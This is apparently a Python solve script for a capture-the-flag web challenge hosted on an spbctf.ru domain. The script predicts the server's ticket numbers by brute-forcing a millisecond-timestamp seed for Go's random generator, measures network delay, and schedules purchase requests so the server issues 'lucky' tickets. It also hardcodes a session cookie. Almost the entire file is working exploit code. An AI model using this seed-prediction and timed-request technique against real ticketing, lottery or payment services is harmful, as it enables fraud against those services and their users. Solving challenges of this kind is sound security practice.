import sched
import time
from collections import Counter
from datetime import datetime, timedelta
from typing import List

import requests

from aaaaaaaaaaaaa import get_random_from_go

COOKIES = {
    "session": "MTcxMzUzNzYxNnxEWDhFQVFMX2dBQUJFQUVRQUFBaF80QUFBUVp6ZEhKcGJtY01DUUFIZFhObGNsOXBaQVIxYVc1MEJnUUFfZ3E1fHILRZzycWXnmZzSEeFAoT5AIFO7ERUhmb5ySsadl7d8"  # noqa
}
DOMAIN = "https://t-luckyticket-w8mg6qr0.spbctf.ru"

answers = [
    180,
]


def custom_generate_ticket_number(time_: datetime):
    seed = int(time_.timestamp() * 1_000)
    return get_random_from_go(seed), seed


def search_server_ticket_time(start_time: datetime, server_ticket_number: str):
    start_time.replace(microsecond=0)
    end_time = start_time + timedelta(seconds=2)
    while start_time < end_time:
        ticket_number, seed = custom_generate_ticket_number(start_time)
        if ticket_number == server_ticket_number:
            return start_time
        start_time += timedelta(milliseconds=1)


def get_milliseconds(td: timedelta):
    ms = td.microseconds / 1000
    print('ms',ms)
    return abs(int(ms))


class Ticketmat:
    _domain: str
    _buy_url: str
    _eat_url: str
    _my_ticket_url: str
    _cookies: dict[str, str]

    def __init__(self, domain: str, cookies: dict[str, str]):
        self._domain = domain
        self._cookies = cookies
        self._buy_url = domain + "/api/ticket/buy"
        self._eat_url = domain + "/api/ticket/eat/"
        self._my_ticket_url = domain + "/api/user/tickets"

    def buy_ticket(self, should_buy) -> None:
        request_time = datetime.now()
        response = requests.post(self._buy_url, cookies=self._cookies)
        incoming_ticket_number = response.json()["number"]
        server_ticket_time = search_server_ticket_time(
            request_time, incoming_ticket_number
        )
        diff = server_ticket_time - request_time
        print(
            f"ПОКУПКА ПОЛЕТЕЛА В {request_time}, НАДО БЫЛО КУПИТЬ В {should_buy} "
            f"БИЛЕТ {incoming_ticket_number} БЫТ КУПЛЕН В {server_ticket_time}, РАЗНИЦА {diff}",
        )
        answers.append(get_milliseconds(diff))

    def get_my_ticket(self) -> requests.Response:
        return requests.get(self._my_ticket_url, cookies=self._cookies)


ticketmat = Ticketmat(DOMAIN, COOKIES)

buy_times: List[datetime] = []


def is_luck_ticket(number: str) -> bool:
    int_number = [int(i) for i in number]
    if sum(int_number[:3]) == sum(int_number[3:]):
        return True
    return False


def generate_lucky_ticket_times(start_period: datetime, end_period: datetime) -> None:
    while start_period < end_period:
        ticket_number, seed = custom_generate_ticket_number(start_period)
        if is_luck_ticket(ticket_number):
            buy_times.append(start_period)
            start_period += timedelta(seconds=1)
        else:
            start_period = start_period + timedelta(milliseconds=20)


# scheduler = sched.scheduler(time.time, time.sleep)
start_time = datetime.now().replace(microsecond=0) + timedelta(seconds=2)
end_time = start_time + timedelta(seconds=300)
generate_lucky_ticket_times(start_time, end_time)
print(buy_times)
for buy_time in buy_times:

    scheduler = sched.scheduler(time.time, time.sleep)

    # common_delay = max(answers, key=Counter(answers).get)
    common_delay = Counter(answers).most_common(1)[0][0]
    time_to_buy_ticket = buy_time - timedelta(milliseconds=common_delay)
    print()
    print(common_delay)
    print(answers)
    print()
    scheduler.enterabs(
        time_to_buy_ticket.timestamp(),
        1,
        ticketmat.buy_ticket,
        argument=(buy_time,),
    )
    scheduler.run()
